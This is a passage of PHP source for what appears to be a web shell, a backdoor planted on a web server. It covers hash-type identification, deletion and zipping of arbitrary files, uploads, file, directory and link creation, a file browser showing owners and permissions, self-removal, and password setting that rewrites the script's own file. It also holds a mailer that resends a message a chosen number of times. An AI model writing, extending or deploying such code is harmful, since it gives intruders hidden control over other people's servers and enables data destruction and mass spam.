				elseif (preg_match('/^\$P\$B[0-9a-zA-Z\/.]$/',$_POST['hash'])) { echo '<li>MD5(WordPress)</li>'; }
				elseif (preg_match('/^\$H\$9[0-9a-zA-Z\/.]$/',$_POST['hash'])) { echo '<li>MD5(PhpBB3)</li>'; }
			}
			elseif ($StrLen === 128) {
				if (CheckHEX($_POST['hash'])) { echo '<li>SHA-512</li><li>WHIRLPOOL</li><li>SALSA20</li>'; }
			}
			elseif ($StrLen === 96) {
				if (CheckHEX($_POST['hash'])) { echo '<li>SHA-384</li>'; }
			}
			elseif ($StrLen === 48) {
				if (CheckHEX($_POST['hash'])) { echo '<li>Haval192</li><li>Haval192_4</li><li>Haval192_5</li><li>Tiger192</li><li>Tiger2</li><li>SALSA10</li>'; }
			}
			elseif ($StrLen === 56) {
				if (CheckHEX($_POST['hash'])) { echo '<li>Haval224</li><li>Haval244_3</li><li>Haval244_4</li><li>SHA224</li>'; }
				if (CheckBase64($_POST['hash'])) { echo '<li>RipeMD320 (Base64)</li>'; }
			}
			elseif ($StrLen === 64) {
				if (CheckHEX($_POST['hash'])) { echo '<li>SNEFRU256</li><li>SHA-256</li><li>RipeMD256</li><li>Panama</li><li>Haval256</li><li>Haval256_3</li><li>Haval256_4</li><li>Haval256_5</li>'; }
				elseif (preg_match('/^[0-9a-zA-Z+\/.]+$/',$_POST['hash'])) { echo '<li>SHA384 (Base64)</li>'; }
			}
			elseif ($StrLen === 37) {
				if (preg_match('/^\$apr1\$[0-9a-zA-Z\/.]{8}\$[0-9a-zA-Z\/.]{22} $/',$_POST['hash'])) { echo '<li>MD5 (APR)</li>'; }
			}
			elseif ($StrLen === 80) {
				if (CheckHEX($_POST['hash'])) { echo '<li>RipeMD320</li>'; }
			}
			elseif ($StrLen === 24) {
				if (CheckBase64($_POST['hash'])) { echo '<li>Haval128 (Base64)</li><li>MD2 (Base64)</li><li>MD4 (Base64)</li><li>MD5 (Base64)</li><li>RipeMD128 (Base64)</li><li>SNEFRU128 (Base64)</li><li>Tiger128 (Base64)</li>'; }
			}
			elseif ($StrLen === 28) {
				if (preg_match('/^[0-9a-zA-Z+\/.]+=$/',$Hash)) { echo  '<li>SHA-1 (Base64)</li><li>Haval160 (Base64)</li><li>RipeMD160 (Base64)</li><li>Tiger160 (Base64)</li>'; }
			}
			elseif ($StrLen === 44) {
				if (preg_match('/^[0-9a-zA-Z+\/.]+=$/',$Hash)) { echo  '<li>Haval256 (Base64)</li><li>RipeMD256 (Base64)</li><li>SHA256 (Base64)</li><li>SNEFRU256 (Base64)</li>'; }
			}
			elseif ($StrLen === 88) {
				if (CheckBase64($_POST['hash'])) { echo '<li>SHA512 (Base64)</li><li>WHIRLPOOL (Base64)</li>'; }
			}
			elseif ($StrLen === 9) {
				if (is_numeric($_POST['hash'])) { echo '<li>Elf-32</li>'; }
			}
			
			echo '</ol>';
		}
		echo '</fieldset>';
	}
	elseif ($_GET['action'] === 'X') {
		if (isset($_POST['F'])) {
			switch($_REQUEST['val']) {
				case 1:{
					if (is_array($_REQUEST['F'])) {
						echo '<h3>Delete Files</h3><table border="1" cellspacing="1" cellpadding="5">';
						foreach ($_REQUEST['F'] AS $File) {
							echo '<tr><td>',$File,'</td><td><font color="'; if (unlink($File)) { echo 'green">[+'; } else { echo 'red">[-'; } echo ']</font></tr>';
						}
						echo '</table>';
					}
					else {
						if (unlink($_REQUEST['F'])) { echo 'File was successfully Deleted.'; } else { echo 'Error while deleting file.<br />';GetLastError(); }
					}
				} break;
				case 3: {
					if (class_exists('ZipArchive')) {
						$Zip = new ZipArchive;
						for (;;) {
							$Archive = 'ZippedFiles' . md5(microtime()) . '.zip';
							if (!file_exists($Archive)) { break; }
						}
						if ($Zip->open($Archive,ZIPARCHIVE::CREATE) === TRUE) {
							foreach ($_POST['F'] AS $File) { $Zip->addFile($File); }
							$Zip->close();
							echo 'Zip Archive was successfully created. (<a href="?dir=',$SCDIR,'&amp;action=download&amp;file=',$Archive,'">',$Archive,'</a>)<br />)';
						}
						else { echo 'Could not create a ZIP Archive'; }
					}
					else { echo 'The ZipArchive Class does not exist'; }
				} break;
				default: { echo 'Invalid Operation'; }
			}
		}
		else { echo 'Choose files to delete.'; }
	}
	elseif ($_GET['action'] === 'selfremove') {
		if (unlink(__FILE__)) { echo 'Shell was removed successfully.'; }
		else { echo 'Error while removing shell, Could not delete the file.';GetLastError(); }
	}
	elseif ($_GET['action'] === 'mailer') {
		$Func1 = function_exists('mail'); $Func2 = function_exists('imap_mail');
		if ($Func1||$Func2) {
			if (isset($_POST['To'])) {
				$Suc = TRUE;
				$HowMany = (int)$_POST['HowMany'] - 1;
				if ($Func1) {
					if (mail($_REQUEST['To'],$_REQUEST['Sub'],$_REQUEST['Message'],$_REQUEST['Heads'])) { echo 'E-Mail was sent successfully!'; }
					else { echo 'Error While Sending Mail.';GetLastError(); echo '<br />'; $Suc = FALSE; }
					if ($Suc = TRUE && $HowMany > 1) {
						for ($i = 0; $i <= $HowMany; $i++) { mail($_POST['To'],$_POST['Sub'],$_POST['Message'],$_POST['Heads']); }
					}
				}
				else {
					if (imap_mail($_REQUEST['To'],$_REQUEST['Sub'],$_REQUEST['Message'],$_REQUEST['Heads'])) { echo 'E-Mail was sent successfully!'; }
					else { echo 'Error While Sending Mail.';GetLastError(); echo '<br />'; $Suc = FALSE; }
					if ($Suc = TRUE && $HowMany > 1) {
						for ($i = 0; $i <= $HowMany; $i++) { imap_mail($_POST['To'],$_POST['Sub'],$_POST['Message'],$_POST['Heads']); }
					}
				}
			}
			echo '<form action="" method="post"><fieldset style="width:590px;"><legend>Send E-Mail</legend>
			<table><tr><td>Sender E-Mail:</td><td><input type="text" name="From" id="From" size="40" /></td></tr><tr><td>
			Recipient\'s E-Mail:</td><td><input type="text" name="To" id="To" size="40" value="[Separated by \',\']" /></td></tr><tr><td>
			Subject:</td><td><input type="text" name="Sub" id="Sub" size="40" /></td></tr></table><br />
			Message:<br /><textarea rows="7" cols="70" id="Message" name="Message"></textarea><br /><br />
			Additional Headers:<br /><textarea rows="7" cols="50" id="Heads" name="Heads" spellcheck="false">[Separated by Enter]'."\r\n".'Example:',"\r\n",'X-Mailer: PHP/4.3',"\r\n",'Reply-To: example@something.com</textarea><br />
			<br />How many Times: <input type="text" size="1" id="HowMany" name="HowMany" /><br />
			<br /><input type="reset" value="Reset" /> <input type="submit" value="Send!" />
			</fieldset></form>';
		}
		else { echo 'Can\'t Send E-Mail From this Server.'; }
	}
	elseif ($_GET['action'] === 'passset') {
		if ($Auth === FALSE) {
			if (!empty($_POST['password'])) {
				if (!function_exists('file_get_contents') && (function_exists('fopen') && (function_exists('fread') || function_exists('fgets') || function_exists('fgetc')))) {
					if (function_exists('fread')) {
						function file_get_contents($File) {
							$handle = fopen($File, 'rb');
							$contents = fread($handle,sprintf('%u',filesize($File)));
							fclose($handle);
							return $contents;
						}
					}
					elseif (function_exists('fgets')) {
						function file_get_contents($File) {
							$handle = fopen($File, 'rb');
							$contents = ''; $Line = '';
							do {
								$Line = fgets($handle,sprintf('%u',filesize($File)));
								$contents .= $Line;
							} while ($Line !== FALSE);
							fclose($handle);
							return $contents;
						}
					}
					else {
						function file_get_contents($File) {
							$handle = fopen($File, 'rb');
							$contents = ''; $Character = '';
							do {
								$Character = fgetc($handle,sprintf('%u',filesize($File)));
								$contents .= $Character;
							} while ($Character !== FALSE);
							fclose($handle);
							return $contents;
						}
					}
				}
				elseif (!function_exists('file_get_contents')) {
					echo 'Could not set password (no available functions).'; $BAD = TRUE;
				}
				if (!function_exists('file_put_contents') && (function_exists('fopen') && (function_exists('fputs') || function_exists('fwrite') || function_exists('fputcsv')))) {
					if (function_exists('fwrite')) {
						function file_get_contents($File,$StringT) {
							$handle = fopen($File, 'wb');
							$ret = fwrite($handle,$StringT);
							fclose($handle);
							return $ret;
						}
					}
					elseif (function_exists('fputs')) {
						function file_get_contents($File,$StringT) {
							$handle = fopen($File, 'wb');
							$ret = fputs($handle,$StringT);
							fclose($handle);
							return $ret;
						}
					}
					else {
						function file_get_contents($File,$StringT) {
							$handle = fopen($File, 'wb');
							$ret = fputcsv($handle,array($StringT));
							fclose($handle);
							return $ret;
						}
					}
				}
				elseif (!function_exists('file_put_contents')) {
					echo 'Could not set password (no available functions).'; $BAD = TRUE;
				}
				if (!isset($BAD)) {
					$ShellContents = file_get_contents(__FILE__);
					if (file_put_contents(__FILE__,substr_replace($ShellContents,'$Auth = TRUE; $Password = \''.sha1(md5($_POST['password'])).'\';',strpos($ShellContents,'$Auth = FALSE;'),14)) != 0) { echo 'Password set.'; }
					else { echo 'An error occured, the password was not set.'; GetLastError(); }
				}
			}
			else {
				echo
				'<form action="" method="post">
					Set shell password: <input type="text" id="password" name="password" /> <input type="submit" value="Enter" /><br /><br />Your password will be MD5 hashed & SHA1 hashed before it will be written to the shell file.
				</form>';
			}
		}
		else {
			if (!empty($_POST['removep'])) {
				if (!function_exists('file_get_contents') && (function_exists('fopen') && (function_exists('fread') || function_exists('fgets') || function_exists('fgetc')))) {
					if (function_exists('fread')) {
						function file_get_contents($File) {
							$handle = fopen($File, 'rb');
							$contents = fread($handle,sprintf('%u',filesize($File)));
							fclose($handle);
							return $contents;
						}
					}
					elseif (function_exists('fgets')) {
						function file_get_contents($File) {
							$handle = fopen($File, 'rb');
							$contents = ''; $Line = '';
							do {
								$Line = fgets($handle,sprintf('%u',filesize($File)));
								$contents .= $Line;
							} while ($Line !== FALSE);
							fclose($handle);
							return $contents;
						}
					}
					else {
						function file_get_contents($File) {
							$handle = fopen($File, 'rb');
							$contents = ''; $Character = '';
							do {
								$Character = fgetc($handle,sprintf('%u',filesize($File)));
								$contents .= $Character;
							} while ($Character !== FALSE);
							fclose($handle);
							return $contents;
						}
					}
				}
				elseif (!function_exists('file_get_contents')) {
					echo 'Could not remove password (no available functions).'; $BAD = TRUE;
				}
				if (!function_exists('file_put_contents') && (function_exists('fopen') && (function_exists('fputs') || function_exists('fwrite') || function_exists('fputcsv')))) {
					if (function_exists('fwrite')) {
						function file_get_contents($File,$StringT) {
							$handle = fopen($File, 'wb');
							$ret = fwrite($handle,$StringT);
							fclose($handle);
							return $ret;
						}
					}
					elseif (function_exists('fputs')) {
						function file_get_contents($File,$StringT) {
							$handle = fopen($File, 'wb');
							$ret = fputs($handle,$StringT);
							fclose($handle);
							return $ret;
						}
					}
					else {
						function file_get_contents($File,$StringT) {
							$handle = fopen($File, 'wb');
							$ret = fputcsv($handle,array($StringT));
							fclose($handle);
							return $ret;
						}
					}
				}
				elseif (!function_exists('file_put_contents')) {
					echo 'Could not remove password (no available functions).'; $BAD = TRUE;
				}
				if (!isset($BAD)) {
					$ShellContents = file_get_contents(__FILE__);
					if (file_put_contents(__FILE__,substr_replace($ShellContents,'$Auth = FALSE;',strpos($ShellContents,'$Auth = TRUE; $Password = \''.$Password.'\';'),70)) != 0) { echo 'Password removed.'; $_SESSION['SLOGIN'] = NULL; }
					else { echo 'An error occured, the password was not removed.'; GetLastError(); }
				}
			}
			else {
				echo
				'<form action="" method="post">
					Remove the shell password? <input type="submit" id="removep" name="removep" value="Remove" />
				</form>';
			}
		}
	}
}
else {
	if ($ShowFiles) {
		if (isset($_GET['act'])) {
			if ($_GET['act'] === 'Upload') {
				if (!isset($_FILES)) { $_FILES = $HTTP_POST_FILES; }
				if (move_uploaded_file($_FILES['File']['tmp_name'],$_FILES['File']['name'])) { echo '\'',htmlspecialchars($_FILES['File']['name']),'\' Was uploaded successfully.'; }
				else {
					echo 'Could not transfer the uploaded file from \'',htmlspecialchars($_FILES['File']['tmp_name']),'\' to \'',htmlspecialchars($CDIR.$_FILES['File']['name']),'\'.<br /><br />';
					if (isset($_FILES['File']['error'])) {
						if ($_FILES['File']['error'] === 1) { echo 'The uploaded file exceeds the upload_max_filesize directive in php.ini.'; }
						elseif ($_FILES['File']['error'] === 2) { echo 'The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form.'; }
						elseif ($_FILES['File']['error'] === 3) { echo 'The uploaded file was only partially uploaded.'; }
						elseif ($_FILES['File']['error'] === 4) { echo 'No file was uploaded.'; }
						elseif ($_FILES['File']['error'] === 6) { echo 'Missing a temporary folder.'; }
						elseif ($_FILES['File']['error'] === 7) { echo 'Failed to write file to disk.'; }
						elseif ($_FILES['File']['error'] === 8) { echo 'A PHP extension stopped the file upload. PHP does not provide a way to ascertain which extension caused the file upload to stop;'; }
						echo '<br /><br />';
					}
					echo '<b>[php.ini]</b><br />file_uploads: ',ini_get('file_uploads'),' | upload_max_filesize: ',ini_get('upload_max_filesize'),' | max_file_uploads: ',ini_get('max_file_uploads'),'<br />';
					GetLastError();
				}
				if (isset($_FILES['File2'])) {
					echo '<br />';
					$i = 2; $File = '';
					while (isset($_FILES['File'.$i])) {
						$File = $_FILES['File'.$i];
						if (move_uploaded_file($File['tmp_name'],$File['name'])) { echo '\'',htmlspecialchars($File['name']),'\' Was uploaded successfully.<br />'; }
						else {
							if (!isset($ErrorOccured)) { $ErrorOccured = TRUE; }
							echo 'Could not transfer the uploaded file from \'',htmlspecialchars($File['tmp_name']),'\' to \'',htmlspecialchars($CDIR.$File['name']),'\'.<br />';
							if (isset($File['error'])) {
								if ($File['error'] === 1) { echo 'The uploaded file exceeds the upload_max_filesize directive in php.ini.'; }
								elseif ($File['error'] === 2) { echo 'The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form.'; }
								elseif ($File['error'] === 3) { echo 'The uploaded file was only partially uploaded.'; }
								elseif ($File['error'] === 4) { echo 'No file was uploaded.'; }
								elseif ($File['error'] === 6) { echo 'Missing a temporary folder.'; }
								elseif ($File['error'] === 7) { echo 'Failed to write file to disk.'; }
								elseif ($File['error'] === 8) { echo 'A PHP extension stopped the file upload. PHP does not provide a way to ascertain which extension caused the file upload to stop;'; }
								echo '<br /><br />';
							}
							if (isset($ErrorOccured)) { echo '<br /><b>[php.ini]</b><br />file_uploads: ',ini_get('file_uploads'),' | upload_max_filesize: ',ini_get('upload_max_filesize'),' | max_file_uploads: ',ini_get('max_file_uploads'),'<br />'; }
							GetLastError();
						}
						++$i;
					}
				}
			}
			elseif ($_GET['act'] === 'FileMake') {
				if (!empty($_POST['fm'])) {
					echo '<b>File Making:</b><br />';
					$CanMake = TRUE; $Name = $_POST['fm']; if (strpos($_POST['fm'], '.') !== FALSE) { $Name = substr($_POST['fm'],0,strlen($_POST['fm'])-strlen(strrchr($_POST['fm'],'.'))-1); }
					$WinReservedChars = array('<','>',':','"','/','\\','|','?','*');
					if ($IsWIN) {
						foreach ($WinReservedChars AS $ResC) {
							if (strpos($_POST['fm'],$ResC) !== FALSE) { echo '<span style="color:red;">Reserved Windows filename character: \'',$ResC,'\'</span><br />'; $CanMake = FALSE; }
						}
						foreach (range(0x00,0x1F) AS $ResC) {
							if (strpos($_POST['fm'],$ResC) !== FALSE) { echo '<span style="color:red;">Reserved Windows filename character: 0x',dechex($ResC),'</span><br />'; $CanMake = FALSE; }
						}
						if ($CanMake && in_array($Name,array('CON','PRN','AUX','NUL','COM1','COM2','COM3','COM4','COM5','COM6','COM7','COM8','COM9','LPT1','LPT2','LPT3','LPT4','LPT5','LPT6','LPT7','LPT8','LPT9'))) {
							echo '<span style="color:red;">Do not use the following reserved device names for the name of a file:</span><br />CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9. Also avoid these names followed immediately by an extension; for example, NUL.txt is not recommended.'; $CanMake = FALSE;
						}
						else {
							if ($_POST['fm'][strlen($_POST['fm'])-1] === ' ' || $_POST['fm'][strlen($_POST['fm'])-1] === '.') {
								echo 'Do not end a file or directory name with a space or a period. Although the underlying file system may support such names, the Windows shell and user interface does not. However, it is acceptable to specify a period as the first character of a name. For example, ".temp".<br /><span style="color:orange;">The file will be created with the name \'',substr($_POST['fm'],0,strlen($_POST['fm'])-1),'\'</span>.<br />'; $RmLast = TRUE;
							}
						}
					}
					else {
						if (strpos($_POST['fm'],0x00)!==FALSE || strpos($_POST['fm'],'/')!==FALSE) { echo '<span style="color:red;">The filename you entered contains a reserved UNIX filename character (\'/\',0x00 [NUL]).</span><br />'; $CanMake = FALSE; }
					}
					if ($CanMake && is_file($_POST['fm'])) { echo '\'',htmlspecialchars($_POST['fm']),'\' - File Already exists.'; }					
					elseif ($CanMake) {
						if (isset($RmLast)) { $_POST['fm'] = substr($_POST['fm'],0,strlen($_POST['fm'])-1); }
						$FILE = fopen($_POST['fm'],'x');
						echo '\'',htmlspecialchars($_POST['fm']),'\' - <font ';
						if ($FILE) { echo 'color="green">File was created.</font>'; }
						else {
							echo 'color="red">[File ',realpath($CDIR.$_POST['fm']),' could not be created]</font>';
							GetLastError();
						}
						fclose($FILE);
					}
				}
				else { echo 'Please enter a File Name.'; }
			}
			elseif ($_GET['act'] === 'DirMake') {
				if (is_dir($_POST['dm'])) { echo '\'',htmlspecialchars($_POST['dm']),'\' - Directory Already exists.'; }
				else {
					echo '\'',htmlspecialchars($_POST['dm']),'\' - <font ';
					if (mkdir($_POST['dm'])) { echo 'color="green">Directory was created.</font>'; }
					else {
						echo 'color="red">[Directory ',realpath($CDIR.$_POST['dm']),' could not be created]</font>';
						GetLastError();
					}
				}
			}
			elseif ($_GET['act'] === 'Link') {
				if ($_POST['type'] === 's') {
					if (function_exists('symlink') && symlink($_POST['To'],$_POST['Name'])) {
						echo 'Symbolic Link \'',$_POST['Name'],'\' to \'',$_POST['To'],'\' was successfully created.';
					}
					else { echo 'Could not create Symbolic Link. (symlink() does not exist or did not succeed)'; }
				}
				else {
					if (function_exists('link') && link($_POST['To'],$_POST['Name'])) {
						echo 'Hard Link \'',$_POST['Name'],'\' to \'',$_POST['To'],'\' was successfully created.';
					}
					else { echo 'Could not create Hard Link. (link() does not exist or did not succeed)'; }
				}
			}
			echo '<br /><br />';
		}
		$dir = array(); $i = 0;
		//if (function_exists('scandir')) { $dir = scandir('.'); }
		//if (function_exists('opendir') && function_exists('readdir')) { $Handle = opendir('.'); while ($dir[$i++] = readdir($Handle)) { } closedir($Handle); array_pop($dir); }
		//if (function_exists('dir') && $Handle = dir('.')) { while ($dir[$i++] = $Handle->read()) { } $Handle->close(); array_pop($dir); }
		if (function_exists('glob')) { $dir = glob('*',GLOB_NOSORT); $GLOB = TRUE; }
		if (isset($_GET['sort'])) {
			if ($_GET['sort'] === 'date') {
				array_multisort(array_map('filemtime', $dir), SORT_DESC, $dir);
			}
		}
		$dirCount = count($dir); $i = 0;
		if (($dir === FALSE) || (isset($GLOB) && !realpath('..'))) { echo '<div style="border-style:solid;border-width:2px;border-color:#7D7D7D;padding:10px;background-color:#282828;"><font color="red">:: Error while Loading Files - Invalid location\Function failure ::</font><br /><br />';GetLastError(); echo '</div><br /><br /><button title="Go Back in history (using JavaScript)" onclick="window.history.go(-1)">Go Back?</button>'; }
		else {
			/*white-space:pre so no indentions*/
			$S = 0; $R = 0; $F = 0; $Z = 0; $Dirs = array(); $Files = array();
			if (strpos($_SERVER['HTTP_USER_AGENT'],'Firefox') !== FALSE && strpos($_SERVER['HTTP_USER_AGENT'],'Windows') !== FALSE) { $ImgSRC = 'moz-icon://'; }
			else { $ImgSRC = '?action=img&amp;ext='; }
			
			if (isset($_GET['search'])) { echo '<h2>Search results:</h2>'; }
			
			echo '<form action="?dir=',$SCDIR,'&amp;action=X" method="post" id="Form"><div style="white-space:pre;border-style:solid;border-width:2px;border-color:#7D7D7D;overflow:auto;text-align:left;max-height:700px;width:95%;font-family:Verdana,Tahoma,Arial,Helvetica;background-color:#282828;" title="Server Files"><table class="RightPad" style="border-spacing:0px;"><tr style="color:red;"><th style="text-align:left;">Name</th><th style="text-align:left;">Size</th><th style="text-align:left;">Last Modified</th><th style="padding-right:30px;text-align:left;">UID/GID</th><th style="text-align:left;">Perms</th><th style="text-align:left;">Actions</th></tr>',"\r\n";

			if (isset($GLOB) && !isset($_GET['search'])) {
				$Dot = '.'; $DDot = '..';
				echo '<tr onmouseover="this.style.backgroundColor=\'#8B0000\';" onmouseout="this.style.backgroundColor=\'\';"><td><table class="NoPad" style="margin-left:-2px;"><tr><td><img src="?action=img&amp;image=dir" width="17" height="14" alt="[DIR]" /></td><td><a href="?dir=',$SCDIR,'.">.</a></td></tr></table></td><td>DIR</td><td>',date('F d Y H:i:s.',filemtime($Dot)),'</td><td>'; $A = filegroup($Dot); $B = fileowner($Dot); echo $B; if (function_exists('posix_getpwuid')) { $PwUID = posix_getpwuid($B); echo ' (',$PwUID['name'],')'; } echo '/',$A; if (function_exists('posix_getgrgid')) { $PwGID = posix_getgrgid($A); if (is_array($PwGID)) { echo ' (',$PwGID['name'],')'; } } echo '</td><td><font'; $A = GetPerms($Dot); $B = substr($A,7); if ($B === '--x'||$B === '---') { echo ' color="red">'; } elseif ($B === 'rwx'||$B === 'rw-') { echo ' color="green">'; } else { echo '>'; } echo $A.'</font></a></td><td><a href="?action=dir&amp;dir=',$SCDIR,'&amp;dirname=.">INFO</a></td></tr>
				<tr onmouseover="this.style.backgroundColor=\'#8B0000\';" onmouseout="this.style.backgroundColor=\'\';"><td><table class="NoPad" style="margin-left:-2px;"><tr><td><img src="?action=img&amp;image=dir" width="17" height="14" alt="[DIR]" /></td><td><a href="?dir=',$SCDIR,'..">..</a></td></tr></table></td><td>DIR</td><td>',date('F d Y H:i:s.',filemtime($DDot)),'</td><td>'; $A = filegroup($DDot); $B = fileowner($DDot); echo $B; if (function_exists('posix_getpwuid')) { $PwUID = posix_getpwuid($B); echo ' (',$PwUID['name'],')'; } echo '/',$A; if (function_exists('posix_getgrgid')) { $PwGID = posix_getgrgid($A); if (is_array($PwGID)) { echo ' (',$PwGID['name'],')'; } } echo '</td><td><font'; $A = GetPerms($DDot); $B = substr($A,7); if ($B === '--x'||$B === '---') { echo ' color="red">'; } elseif ($B === 'rwx'||$B === 'rw-') { echo ' color="green">'; } else { echo '>'; } echo $A.'</font></a></td><td><a href="?action=dir&amp;dir=',$SCDIR,'&amp;dirname=..">INFO</a></td></tr>';
			}
			
			if (isset($_GET['search'])) {
				if (!isset($GLOB) && function_exists('array_search')) {
					$DOTSearch = array_search('.',$dir); if ($DOTSearch !== FALSE) { unset($dir[$DOTSearch]); ++$i; }
					$DOTSearch = array_search('..',$dir); if ($DOTSearch !== FALSE) { unset($dir[$DOTSearch]); ++$i; }
				}
				$Valid = array(); $dirCount = count($dir); $tempcounter = 0;
				if (isset($_GET['casein'])) { $_GET['search'] = strtolower($_GET['search']); }
					
				if ($_GET['type'] === 'regexp') {
					for ($k = 0;$i < $dirCount;$i++) {
						if (preg_match($_GET['search'],$dir[$i])) { $Valid[$k++] = $i; }
					}
				}
				elseif ($_GET['type'] === 'lengthless') {
					for ($k = 0;$i < $dirCount;$i++) {
						if (strlen($dir[$i]) < $_GET['search']) { $Valid[$k++] = $i; }
					}
				}
				elseif ($_GET['type'] === 'lengthabove') {
					for ($k = 0;$i < $dirCount;$i++) {
						if (strlen($dir[$i]) > $_GET['search']) { $Valid[$k++] = $i; }
					}
				}
				elseif (isset($_GET['casein'])) {
					if ($_GET['type'] === 'exact') {
						for ($k = 0;$i < $dirCount;$i++) {
							if ($_GET['search'] === strtolower($dir[$i])) { $Valid[$k++] = $i; }
						}
					}
					elseif ($_GET['type'] === 'begins') {
						for ($k = 0;$i < $dirCount;$i++) {
							if (strpos(strtolower($dir[$i]),$_GET['search']) === 0) { $Valid[$k++] = $i; }
						}
					}
					elseif ($_GET['type'] === 'nbegins') {
						for ($k = 0;$i < $dirCount;$i++) {
							if (strpos(strtolower($dir[$i]),$_GET['search']) !== 0) { $Valid[$k++] = $i; }
						}
					}
					elseif ($_GET['type'] === 'ends') {
						$Length = strlen($_GET['search']);
						for ($k = 0;$i < $dirCount;$i++) {
							if (preg_match('/'.preg_quote($_GET['search'],'/i').'$/',$dir[$i])) { $Valid[$k++] = $i; }
						}
					}
					elseif ($_GET['type'] === 'nends') {
						$Length = strlen($_GET['search']);
						for ($k = 0;$i < $dirCount;$i++) {
							if (!preg_match('/'.preg_quote($_GET['search'],'/i').'$/',$dir[$i])) { $Valid[$k++] = $i; }
						}
					}
					elseif ($_GET['type'] === 'nendsbegins') {
						$Length = strlen($_GET['search']);
						for ($k = 0;$i < $dirCount;$i++) {
							if (!preg_match('/.+'.preg_quote($_GET['search'],'/i').'.+$/',$dir[$i])) { $Valid[$k++] = $i; }
						}
					}
					elseif ($_GET['type'] === 'contains') {
						for ($k = 0;$i < $dirCount;$i++) {
							if (strpos(strtolower($dir[$i]),$_GET['search']) !== FALSE) { $Valid[$k++] = $i; }
						}
					}
					elseif ($_GET['type'] === 'ncontains') {
						for ($k = 0;$i < $dirCount;$i++) {
							if (strpos(strtolower($dir[$i]),$_GET['search']) === FALSE) { $Valid[$k++] = $i; }
						}
					}
				}
				elseif (!isset($_GET['casein'])) {
					if ($_GET['type'] === 'exact') {
						for ($k = 0;$i < $dirCount;$i++) {
							if ($_GET['search'] === $dir[$i]) { $Valid[$k++] = $i; }
						}
					}
					elseif ($_GET['type'] === 'begins') {
						for ($k = 0;$i < $dirCount;$i++) {
							if (strpos($dir[$i],$_GET['search']) === 0) { $Valid[$k++] = $i; }
						}
					}
					elseif ($_GET['type'] === 'nbegins') {
						for ($k = 0;$i < $dirCount;$i++) {
							if (strpos($dir[$i],$_GET['search']) !== 0) { $Valid[$k++] = $i; }
						}
					}
					elseif ($_GET['type'] === 'ends') {
						$Length = strlen($_GET['search']);
						for ($k = 0;$i < $dirCount;$i++) {
							if (preg_match('/'.preg_quote($_GET['search'],'/').'$/',$dir[$i])) { $Valid[$k++] = $i; }
						}
					}
					elseif ($_GET['type'] === 'nends') {
						$Length = strlen($_GET['search']);
						for ($k = 0;$i < $dirCount;$i++) {
							if (!preg_match('/'.preg_quote($_GET['search'],'/').'$/',$dir[$i])) { $Valid[$k++] = $i; }
						}
					}
					elseif ($_GET['type'] === 'nendsbegins') {
						$Length = strlen($_GET['search']);
						for ($k = 0;$i < $dirCount;$i++) {
							if (!preg_match('/.+'.preg_quote($_GET['search'],'/').'.+$/',$dir[$i])) { $Valid[$k++] = $i; }
						}
					}
					elseif ($_GET['type'] === 'contains') {
						for ($k = 0;$i < $dirCount;$i++) {
							if (strpos($dir[$i],$_GET['search']) !== FALSE) { $Valid[$k++] = $i; }
						}
					}
					elseif ($_GET['type'] === 'ncontains') {
						for ($k = 0;$i < $dirCount;$i++) {
							if (strpos($dir[$i],$_GET['search']) === FALSE) { $Valid[$k++] = $i; }
						}
					}
				}
				$validCount = count($Valid);
				for ($k = 0,$l = 0; $tempcounter < $validCount; $tempcounter++) {
					if (is_file($dir[$Valid[$tempcounter]])) { $Files[$k++] = $Valid[$tempcounter]; }
					else { $Dirs[$l++] = $Valid[$tempcounter]; }
				}
			}
			else {
				for ($i = 0,$k = 0,$l = 0; $i < $dirCount; $i++) {
					if (is_file($dir[$i])) { $Files[$k++] = $i; }
					else { $Dirs[$l++] = $i; }
				}
			}
			foreach ($Dirs AS $dirFILE) {
				/*display directories*/
				++$R; echo '<tr onmouseover="this.style.backgroundColor=\'#8B0000\';" onmouseout="this.style.backgroundColor=\'\';"><td><table class="NoPad" style="margin-left:-2px;"><tr><td><img src="?action=img&amp;image=dir" width="17" height="14" alt="Dir" /></td><td><a href="?dir=',$SCDIR,urlencode($dir[$dirFILE]),'">['.$dir[$dirFILE].']</a></td></tr></table></td><td>DIR</td><td>',date('F d Y H:i:s.',filemtime($dir[$dirFILE])).'</td><td>'; $A = filegroup($dir[$dirFILE]); $B = fileowner($dir[$dirFILE]); echo $B; if (function_exists('posix_getpwuid')) { $PwUID = posix_getpwuid($B); echo ' (',$PwUID['name'],')'; } echo '/',$A; if (function_exists('posix_getgrgid')) { $PwGID = posix_getgrgid($A); if (is_array($PwGID)) { echo ' (',$PwGID['name'],')'; } } echo '</td><td><a href="?action=file&amp;act=chmod&amp;file=',urlencode($dir[$dirFILE]),'&amp;dir=',$SCDIR,'"><font'; $A = GetPerms($dir[$dirFILE]); $B = substr($A,7); if ($B === '--x'||$B === '---') { echo ' color="red">'; } elseif ($B === 'rwx'||$B === 'rw-') { echo ' color="green">'; } else { echo '>'; } echo $A,'</font></a></td><td><a href="?action=dir&amp;dir=',$SCDIR,'&amp;dirname=',urlencode($dir[$dirFILE]),'">INFO</a></td></tr>';
			}
			foreach ($Files AS $dirFILE) {
				if (is_link($dir[$dirFILE])) {
					/*display links*/
					++$L; echo '<tr onmouseover="this.style.backgroundColor=\'#8B0000\';" onmouseout="this.style.backgroundColor=\'\';"><td><table class="NoPad" style="margin-left:-2px;"><tr><td><img src="?action=img&amp;image=link" width="16" height="16" alt="SymLink" /></td><td>'; $L = readlink($dir[$dirFILE]); if (is_dir($dir[$dirFILE])) { echo '<a href="?dir=',urlencode(realpath($dir[$dirFILE])),'">[',$dir[$dirFILE],']'; } else { echo '<a href="?action=file&amp;file=',realpath($L),'">',$dir[$dirFILE]; } echo '</a></td></tr></table></td><td>LINK -> ',$L; if (linkinfo($L) != -1) { echo ' <font color="green">[Exists]</font>'; } else { echo ' <font color="red">[Exists]</font>'; }  echo '</td><td>',date('F d Y H:i:s.',filemtime($dir[$dirFILE])),'</td><td>'; $A = filegroup($dir[$dirFILE]); $B = fileowner($dir[$dirFILE]); echo $B; if (function_exists('posix_getpwuid')) { $PwUID = posix_getpwuid($B); echo ' (',$PwUID['name'],')'; } echo '/',$A; if (function_exists('posix_getgrgid')) { $PwGID = posix_getgrgid($A); if (is_array($PwGID)) { echo ' (',$PwGID['name'],')'; } } echo '</td><td><font'; $A = 